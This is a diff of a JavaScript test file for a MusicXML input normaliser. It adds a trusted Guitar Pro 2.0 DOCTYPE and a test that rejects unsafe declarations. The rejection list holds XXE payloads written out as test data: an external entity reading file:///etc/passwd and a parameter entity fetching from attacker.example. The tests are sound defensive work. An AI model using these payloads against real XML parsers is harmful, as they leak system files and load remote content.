@@ -17,6 +17,8 @@ const TRUSTED_MUSICXML_403_PARTWISE_DOCTYPE =
   '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 4.0.3 Partwise//EN" "http://www.musicxml.org/dtds/partwise.dtd">';
 const TRUSTED_MUSICXML_31_PARTWISE_DOCTYPE =
   '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 3.1 Partwise//EN" "http://www.musicxml.org/dtds/partwise.dtd">';
+const TRUSTED_GUITAR_PRO_MUSICXML_20_PARTWISE_DOCTYPE =
+  "<!DOCTYPE score-partwise PUBLIC '-//Recordare//DTD MusicXML 2.0 Partwise//EN' 'http://www.musicxml.org/dtds/2.0/partwise.dtd'>";
 
 function expectCode(fn, code) {
   assert.throws(fn, (error) => {
@@ -32,10 +34,11 @@ test('accepts UTF-8 strings and buffers without altering the XML', () => {
   assert.equal(normalizeXmlInput(Buffer.from(xml, 'utf8')), xml);
 });
 
-test('accepts and strips exact trusted MusicXML 4.0.3 and 3.1 partwise DOCTYPEs', () => {
+test('accepts and strips exact trusted MusicXML 4.0.3, 3.1 and Guitar Pro 2.0 partwise DOCTYPEs', () => {
   for (const [version, doctype] of [
     ['4.0.3', TRUSTED_MUSICXML_403_PARTWISE_DOCTYPE],
     ['3.1', TRUSTED_MUSICXML_31_PARTWISE_DOCTYPE],
+    ['2.0', TRUSTED_GUITAR_PRO_MUSICXML_20_PARTWISE_DOCTYPE],
   ]) {
     const xml = `<?xml version="1.0" encoding="UTF-8"?>\n${doctype}\n<score-partwise version="${version}"/>`;
     const normalized = normalizeXmlInput(xml);
@@ -44,6 +47,26 @@ test('accepts and strips exact trusted MusicXML 4.0.3 and 3.1 partwise DOCTYPEs'
     assert.match(normalized, /^<\?xml version="1\.0" encoding="UTF-8"\?>/);
     assert.match(normalized, new RegExp(`<score-partwise version="${version.replaceAll('.', '\\.')}"\\/>`));
     assert.equal(normalizeXmlInput(Buffer.from(xml, 'utf8')), normalized);
+  }
+});
+
+test('accepts only the bounded Guitar Pro MusicXML 2.0 declaration shape without resolving it', () => {
+  const doubleQuoted = '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://www.musicxml.org/dtds/2.0/partwise.dtd">\n<score-partwise version="2.0"/>';
+  assert.doesNotMatch(normalizeXmlInput(doubleQuoted), /<!DOCTYPE/i);
+
+  for (const untrusted of [
+    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "file:///etc/passwd"><score-partwise/>',
+    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://attacker.example/2.0/partwise.dtd"><score-partwise/>',
+    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://www.musicxml.org/dtds/2.0/partwise.dtd.evil"><score-partwise/>',
+    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.1 Partwise//EN" "http://www.musicxml.org/dtds/2.0/partwise.dtd"><score-partwise/>',
+    '<!DOCTYPE score-timewise PUBLIC "-//Recordare//DTD MusicXML 2.0 Timewise//EN" "http://www.musicxml.org/dtds/2.0/timewise.dtd"><score-timewise/>',
+    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://www.musicxml.org/dtds/2.0/partwise.dtd" [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><score-partwise>&xxe;</score-partwise>',
+    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://www.musicxml.org/dtds/2.0/partwise.dtd" [<!ENTITY % pe SYSTEM "http://attacker.example/payload"> %pe;]><score-partwise/>',
+    `${TRUSTED_GUITAR_PRO_MUSICXML_20_PARTWISE_DOCTYPE}${TRUSTED_GUITAR_PRO_MUSICXML_20_PARTWISE_DOCTYPE}<score-partwise/>`,
+    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://www.musicxml.org/dtds/2.0/partwise.dtd"><score-timewise/>',
+    '<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 2.0 Partwise//EN" "http://www.musicxml.org/dtds/2.0/partwise.dtd"<score-partwise/>',
+  ]) {
+    expectCode(() => normalizeXmlInput(untrusted), 'UNSAFE_XML_DECLARATION');
   }
 });
 
@@ -99,6 +122,7 @@ test('rejects internal subsets, duplicate declarations and mismatched roots for 
   for (const trustedDoctype of [
     TRUSTED_MUSICXML_403_PARTWISE_DOCTYPE,
     TRUSTED_MUSICXML_31_PARTWISE_DOCTYPE,
+    TRUSTED_GUITAR_PRO_MUSICXML_20_PARTWISE_DOCTYPE,
   ]) {
     expectCode(
       () => normalizeXmlInput(
